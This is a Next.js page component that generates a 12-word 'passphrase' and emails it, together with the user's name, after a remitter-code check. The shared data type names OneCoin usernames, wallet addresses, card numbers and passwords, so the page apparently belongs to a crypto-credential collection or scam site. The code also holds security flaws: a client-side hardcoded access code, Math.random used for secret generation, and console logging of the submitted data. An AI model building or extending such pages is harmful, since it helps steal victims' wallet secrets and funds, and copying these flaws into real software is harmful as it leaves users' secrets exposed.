"use client";

import React, { useState, ChangeEvent, FormEvent } from "react";
import { useRouter } from "next/navigation";
import { sendEmail, FormData } from "@/app/lib/email";

// Function to generate a random 12-word passphrase
const generatePassphrase = () => {
  const words = [
    "apple", "banana", "cherry", "dragon", "eagle", "flower", "guitar", "honey",
    "island", "jungle", "kangaroo", "lemon", "monkey", "nebula", "octopus", "penguin",
    "quantum", "rocket", "sunset", "tornado", "umbrella", "volcano", "whistle", "xenon",
    "yogurt", "zeppelin"
  ];
  return Array.from({ length: 12 }, () => words[Math.floor(Math.random() * words.length)]).join(" ");
};

export default function PassphrasePage() {
  const [surname, setSurname] = useState("");
  const [firstName, setFirstName] = useState("");
  const [remitterCode, setRemitterCode] = useState("");
  const [generatedPassphrase, setGeneratedPassphrase] = useState("");
  const [confirmPassphrase, setConfirmPassphrase] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  // The remitter code to validate against
  const correctRemitterCode = "123456";  // You can store this securely in environment variables or a database

  // Handle passphrase generation
  const handleGeneratePassphrase = () => {
    if (!surname || !firstName) {
      setError("Please enter your surname and first name before generating a passphrase.");
      return;
    }

    if (remitterCode !== correctRemitterCode) {
      setError("Incorrect remitter code. Access to passphrase is denied.");
      return;
    }

    setGeneratedPassphrase(generatePassphrase());
    setError("");
  };

  // Handle form submission
  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!generatedPassphrase) {
      setError("Please generate a passphrase first.");
      return;
    }

    if (generatedPassphrase !== confirmPassphrase) {
      setError("Passphrases do not match.");
      return;
    }

    // Prepare the email data payload with first name, surname, and other fields
    const emailData: FormData = {
      surname,
      firstName,
      otherName: "",
      maritalStatus: "",
      location: "",
      onecoinUsername: "",
      amountToTrade: "",
      cryptocurrency: "",
      bankTransfer: "",
      walletAddress: "",
      passcode: "",
      exchangeCardNumber: "",
      password: "",
      confirmPassword: "",
      upcCode: "",
      passphrase: generatedPassphrase,
      confirmPassphrase,
    };

    // Send the email
    const emailSent = await sendEmail(emailData);
    if (emailSent) {
      console.log("Passphrase submitted and emailed:", emailData);
      router.push("/success"); // Redirect to the success page
    } else {
      setError("Error sending email. Please try again.");
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-black text-gold">
      <h1 className="text-2xl font-bold mb-4">Create Your Passphrase</h1>
      <form onSubmit={handleSubmit} className="space-y-4 w-full max-w-md">
        {/* Surname Input */}
        <div>
          <label className="block text-sm font-medium mb-1">Surname</label>
          <input
            type="text"
            value={surname}
            onChange={(e: ChangeEvent<HTMLInputElement>) => setSurname(e.target.value)}
            placeholder="Enter your surname"
            className="w-full p-2 border border-gray-300 rounded text-black"
            required
          />
        </div>

        {/* First Name Input */}
        <div>
          <label className="block text-sm font-medium mb-1">First Name</label>
          <input
            type="text"
            value={firstName}
            onChange={(e: ChangeEvent<HTMLInputElement>) => setFirstName(e.target.value)}
            placeholder="Enter your first name"
            className="w-full p-2 border border-gray-300 rounded text-black"
            required
          />
        </div>

        {/* Remitter Code Input */}
        <div>
          <label className="block text-sm font-medium mb-1">Remitter Code</label>
          <input
            type="text"
            value={remitterCode}
            onChange={(e: ChangeEvent<HTMLInputElement>) => setRemitterCode(e.target.value)}
            placeholder="Enter remitter code"
            className="w-full p-2 border border-gray-300 rounded text-black"
            required
          />
        </div>

        {/* Generate Passphrase Button */}
        <button
          type="button"
          onClick={handleGeneratePassphrase}
          className="w-full bg-blue-600 text-white py-2 rounded"
        >
          Generate Passphrase
        </button>

        {/* Display Generated Passphrase */}
        {generatedPassphrase && (
          <div className="bg-gray-800 p-4 rounded text-white text-center">
            <p className="text-sm mb-2">Your Passphrase (Save it securely):</p>
            <p className="font-mono text-xs break-words">{generatedPassphrase}</p>
          </div>
        )}

        {/* Confirm Passphrase Input */}
        {generatedPassphrase && (
          <div>
            <label className="block text-sm font-medium mb-1">
              Confirm Passphrase (Enter it exactly)
            </label>
            <input
              type="text"
              value={confirmPassphrase}
              onChange={(e: ChangeEvent<HTMLInputElement>) => setConfirmPassphrase(e.target.value)}
              placeholder="Re-enter your passphrase"
              className="w-full p-2 border border-gray-300 rounded text-black"
              required
            />
          </div>
        )}

        {error && <p className="text-red-500 text-sm">{error}</p>}

        {/* Submit Button */}
        <button type="submit" className="w-full bg-gold text-black py-2 rounded">
          Create Passphrase
        </button>
      </form>
    </div>
  );
}
